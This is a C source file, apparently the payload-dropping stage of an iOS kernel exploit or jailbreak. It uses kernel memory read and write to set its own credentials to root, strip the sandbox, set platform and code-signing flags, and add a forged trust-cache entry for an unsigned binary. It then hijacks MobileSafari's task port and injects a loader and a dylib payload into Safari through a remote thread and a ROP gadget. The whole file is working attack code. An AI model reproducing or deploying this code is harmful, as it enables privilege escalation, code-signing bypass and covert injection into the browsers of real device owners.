#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <spawn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>

#include <dlfcn.h>
#include "mach_vm.h"
#include "parameters.h"
#include "kernel_memory.h"
#include "drop_payload.h"

uint64_t proc_of_pid(pid_t pid) {
    if (kernel_base == 0) return 0;

    uint64_t allproc = kernel_base + OFFSET(kernel_base, allproc);
    uint64_t proc = kernel_read64(allproc), pd;
    while (proc) { //iterate over all processes till we find the one we're looking for
        pd = kernel_read32(proc + OFFSET(proc, p_pid));
        if (pd == pid) return proc;
        proc = kernel_read64(proc);
    }

    return 0;
}

void rootify(uint64_t proc) {
    uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred));
    //make everything 0 without setuid(0), pretty straightforward.
    kernel_write32(proc + OFFSET(proc, p_uid), 0);
    kernel_write32(proc + OFFSET(proc, p_ruid), 0);
    kernel_write32(proc + OFFSET(proc, p_gid), 0);
    kernel_write32(proc + OFFSET(proc, p_rgid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_uid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_ruid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_svuid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_ngroups), 1);
    kernel_write32(ucred + OFFSET(ucred, cr_groups), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_rgid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_svgid), 0);
}

void unsandbox(uint64_t proc) {
    uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred)); // pid credentials
    uint64_t cr_label = kernel_read64(ucred + OFFSET(ucred, cr_label)); // MAC label

    kernel_write64(cr_label + OFFSET(cr_label, sandbox) /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
}

void platformize(uint64_t proc) {
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
    uint32_t t_flags = kernel_read32(task + OFFSET(task, t_flags));
#define TF_PLATFORM        0x00000400   // task is a platform binary
    kernel_write32(task + OFFSET(task, t_flags), t_flags | TF_PLATFORM);

    //patch csflags
    uint32_t csflags = kernel_read32(proc + OFFSET(proc, p_csflags));
#define CS_PLATFORM_BINARY 0x4000000    // this is a platform binary
#define CS_INSTALLER       0x0000008    // has installer entitlement
#define CS_GET_TASK_ALLOW  0x0000004    // has get-task-allow entitlement
#define CS_DEBUGGED        0x10000000   // process is currently or has previously been debugged and allowed to run with invalid pages
#define CS_RESTRICT        0x0000800    // tell dyld to treat restricted
#define CS_HARD            0x0000100    // don't load invalid pages
#define CS_KILL            0x0000200    // kill process if it becomes invalid
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
    kernel_write32(proc + OFFSET(proc, p_csflags), csflags);
}

struct trust_chain {
    uint64_t next;
    unsigned char uuid[16];
    unsigned int count;
} __attribute__((packed));
typedef uint8_t hash_t[20];
void trust_hashes(hash_t *hashes, size_t count) {
    const uint8_t fake_uuid[] = {0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37};
    uint64_t fake_cache = 0;

    uint64_t trust_chain = kernel_base + OFFSET(kernel_base, trustcache);
    printf("[*] trust_chain at 0x%llx\n", trust_chain);

    uint64_t trusted_cache = kernel_read64(trust_chain);
    while (trusted_cache != 0) {
        uint32_t trusted_count = kernel_read32(trusted_cache + 24);
        printf("[*] trust_cache at 0x%llx, count: %d\n", trusted_cache, trusted_count);
        hash_t *trusted_hashes = malloc(trusted_count * sizeof(hash_t));
        kernel_read(trusted_cache + sizeof(struct trust_chain), trusted_hashes, trusted_count * sizeof(hash_t));
        int cnt = 0;
        for (int i = 0; i < count; i++) {
            hash_t *hash = hashes + i;
            for (int j = 0; j < trusted_count; j++) {
                if (memcmp(hash, trusted_hashes + j, sizeof(hash_t)) == 0) {
                    cnt++;
                }
            }
        }
        free(trusted_hashes);

        if (cnt >= count) {
            printf("[*] already trusted\n");
            return;
        }

        uint8_t trusted_uuid[16] = {0};
        kernel_read(trusted_cache + 8, trusted_uuid, 16);
        if (memcmp(trusted_uuid, fake_uuid, 16) == 0) fake_cache = trusted_cache;

        trusted_cache = kernel_read64(trusted_cache);
    }

    const size_t cache_size = 0x4000;
    if (fake_cache == 0) {
        // create new hash block
        struct trust_chain fake_chain;
        fake_chain.next = kernel_read64(trust_chain);
        fake_chain.count = count;
        memcpy(fake_chain.uuid, fake_uuid, 16);

        mach_vm_address_t kernel_trust;
        kern_return_t kr = mach_vm_allocate(kernel_task_port, &kernel_trust, cache_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
          printf("mach_vm_allocate returned %d: %s\n", kr, mach_error_string(kr));
          return;
        }
        printf("[*] allocated: 0x%zx => 0x%llx\n", cache_size, kernel_trust);

        kernel_write(kernel_trust, &fake_chain, sizeof(fake_chain));
        kernel_write(kernel_trust + sizeof(fake_chain), hashes, count * sizeof(hash_t));

        kernel_write64(trust_chain, kernel_trust);
    } else {
        uint32_t trusted_count = kernel_read32(fake_cache + 24);
        if (sizeof(struct trust_chain) + (trusted_count + count) * sizeof(hash_t) <= cache_size) {
            // append hashes
            kernel_write(fake_cache + sizeof(struct trust_chain) + trusted_count * sizeof(hash_t), hashes, count * sizeof(hash_t));
            kernel_write32(fake_cache + 24, trusted_count + count);
        } else {
            printf("[!] hash block size too big\n");
        }
    }
}

uint64_t proc_of_procName(char *nm) {
    uint64_t allproc = kernel_base + OFFSET(kernel_base, allproc);
    uint64_t proc = kernel_read64(allproc);
    char name[40] = {0};
    while (proc) {
        kernel_read(proc + OFFSET(proc, p_comm), name, 40);
        if (strstr(name, nm)) return proc;
        proc = kernel_read64(proc);
    }
    return 0;
}

uint64_t task_port_kaddr_of_proc(uint64_t proc) {
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
    uint64_t itk_space = kernel_read64(task + OFFSET(task, itk_space));
    uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));
    uint64_t task_port_kaddr = kernel_read64(is_table + 0x18);
    return task_port_kaddr;
}

// Original method by Ian Beer
mach_port_t task_for_proc(uint64_t self_proc, uint64_t proc) {
    // allocate a new port we have a send right to
    mach_port_t port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    // find task port in kernel
    uint64_t task_port_kaddr = task_port_kaddr_of_proc(proc);
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));

    // leak some refs
    kernel_write32(task_port_kaddr + 0x4, 0x383838);
    kernel_write32(task + OFFSET(task, ref_count), 0x393939);

    // get the address of the ipc_port of our allocated port
    uint64_t self_task = kernel_read64(self_proc + OFFSET(proc, task));
    uint64_t itk_space = kernel_read64(self_task + OFFSET(task, itk_space));
    uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));
    uint32_t port_index = port >> 8;

    // point the port's ie_object to the task port
    kernel_write64(is_table + (port_index * 0x18), task_port_kaddr);

    // remove our recieve right
    uint32_t ie_bits = kernel_read32(is_table + (port_index * 0x18) + 8);
    ie_bits &= ~(1 << 17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECIEVE)
    kernel_write32(is_table + (port_index * 0x18) + 8, ie_bits);

    return port;
}

void alert(uint64_t self_proc) {
    #define IMPORT_BIN(file, sym) asm(\
        ".data\n"                           /* Change section */\
        ".balign 4\n"                       /* Word alignment */\
        ".private_extern _" #sym "_start\n" /* Export the object address */\
        "_" #sym "_start:\n"                /* Define the object label */\
        ".incbin \"" file "\"\n"            /* Import the file */\
        ".private_extern _" #sym "_end\n"   /* Export the object size */\
        "_" #sym "_end:\n"                  /* Define the object size */\
        ".balign 4\n"                       /* Word alignment */\
        ".text\n")                          /* Restore section */
    IMPORT_BIN("loader.bin", loader);
    IMPORT_BIN("payload.dylib", payload);

    #define STACK_SIZE   0x8000
    #define LOADER_SIZE  0x8000
    #define PAYLOAD_SIZE 0x1000000

    uint64_t proc = proc_of_procName("MobileSafari");
    if (proc == 0) {
      fprintf(stderr, "Unable to get proc of MobileSafari. Cannot continue!\n");
      return;
    }
    fprintf(stderr, "proc of MobileSafari: 0x%llx\n", proc);

    task_t remote_task = task_for_proc(self_proc, proc);
    if (remote_task == MACH_PORT_NULL) {
      fprintf(stderr, "Unable to get task for MobileSafari. Cannot continue!\n");
      return;
    }

    mach_vm_address_t remote_stack = (vm_address_t)NULL;
    kern_return_t kr = mach_vm_allocate(remote_task, &remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
      fprintf(stderr, "Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
      return;
    }
    fprintf(stderr, "Allocated remote stack @0x%llx\n", remote_stack);

    mach_vm_address_t remote_loader = (vm_address_t)NULL;
    kr = mach_vm_allocate(remote_task, &remote_loader, LOADER_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to allocate memory for remote loader in thread: Error %s\n", mach_error_string(kr));
        return;
    }
    fprintf(stderr, "Allocated remote loader @0x%llx\n", remote_loader);

    mach_vm_address_t remote_payload = (vm_address_t)NULL;
    kr = mach_vm_allocate(remote_task, &remote_payload, PAYLOAD_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to allocate memory for remote payload in thread: Error %s\n", mach_error_string(kr));
        return;
    }
    fprintf(stderr, "Allocated remote payload @0x%llx\n", remote_payload);

    mach_vm_address_t remote_buffer = (vm_address_t)NULL;
    kr = mach_vm_allocate(remote_task, &remote_buffer, PAYLOAD_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to allocate memory for remote buffer in thread: Error %s\n", mach_error_string(kr));
        return;
    }
    fprintf(stderr, "Allocated remote buffer @0x%llx\n", remote_buffer);

    extern const uint8_t loader_start, loader_end;
    const uint8_t *start = &loader_start, *end = &loader_end;
    uint64_t *loader = (uint64_t *)start;
    loader[1] = remote_payload;                             // payload
    loader[2] = (uint64_t)dlsym;                            // dlsym
    loader[3] = 0;                                          // startOfFixedExecutableMemoryPool for WebKit, 0 for native
    loader[4] = remote_buffer + PAYLOAD_SIZE;               // remote_buffer end
    loader[5] = remote_loader + 4;                          // memcpyx
    kr = mach_vm_write(remote_task,                         // Task port
                       remote_loader,                       // Virtual Address (Destination)
                       (vm_address_t)start,                 // Source
                       end - start);                        // Length of the source
    if (kr != KERN_SUCCESS) {
      fprintf(stderr, "Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
      return;
    }
    kr = vm_protect(remote_task, remote_loader, LOADER_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to set memory permissions for remote thread: Error %s\n", mach_error_string(kr));
        return;
    }

    extern const uint8_t payload_start, payload_end;
    start = &payload_start, end = &payload_end;
    kr = mach_vm_write(remote_task,                         // Task port
                       remote_payload,                      // Virtual Address (Destination)
                       (vm_address_t)start,                 // Source
                       end - start);                        // Length of the source
    if (kr != KERN_SUCCESS) {
      fprintf(stderr, "Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
      return;
    }

    uint64_t slide = (uint64_t)dlsym - 0x0180919a08;
    uint64_t gadget = slide + 0x0180ae4830; // ret
    arm_thread_state64_t remote_thread_state64 = {0};
    remote_thread_state64.__lr = gadget;
    remote_thread_state64.__sp = (uint64_t)remote_stack + STACK_SIZE / 2;
    remote_thread_state64.__pc = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
    remote_thread_state64.__x[0] = (uint64_t)remote_stack; // pthread_t *thread
    remote_thread_state64.__x[1] = 0; // const pthread_attr_t *attr
    remote_thread_state64.__x[2] = (uint64_t)remote_loader; // void *(*start_routine)(void *)
    remote_thread_state64.__x[3] = 0; // void *arg

    thread_act_t remote_thread;
    kr = thread_create_running(remote_task, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64, ARM_THREAD_STATE64_COUNT , &remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to create remote thread: error %s", mach_error_string(kr));
        return;
    }

    mach_msg_type_number_t thread_state_count = ARM_THREAD_STATE64_COUNT;
    for (;;) {
        kr = thread_get_state(remote_thread, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64, &thread_state_count);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "Error getting stub thread state: error %s", mach_error_string(kr));
            break;
        }

        if (remote_thread_state64.__pc == gadget) {
            printf("Stub thread finished\n");
            kr = thread_terminate(remote_thread);
            if (kr != KERN_SUCCESS) {
                fprintf(stderr, "Error terminating stub thread: error %s", mach_error_string(kr));
            }
            break;
        }
    }
}

void drop_payload() {
    pid_t self_pid = getpid();
    printf("self_pid: %d\n", self_pid);

    uint64_t self_proc = proc_of_pid(self_pid);
    printf("self_proc: 0x%llx\n", self_proc);

    rootify(self_proc);
    printf("uid: %d\n", getuid());

    hash_t hashes[] = {
        {0x25, 0x06, 0xe0, 0xc5, 0x59, 0xc1, 0x1c, 0x97, 0x1a, 0xe4, 0x95, 0x01, 0x08, 0xd6, 0x6b, 0x9c, 0x0b, 0xcc, 0xc0, 0xdf}, // binbag
    };
    trust_hashes(hashes, sizeof(hashes) / sizeof(hash_t));

    alert(self_proc);
}
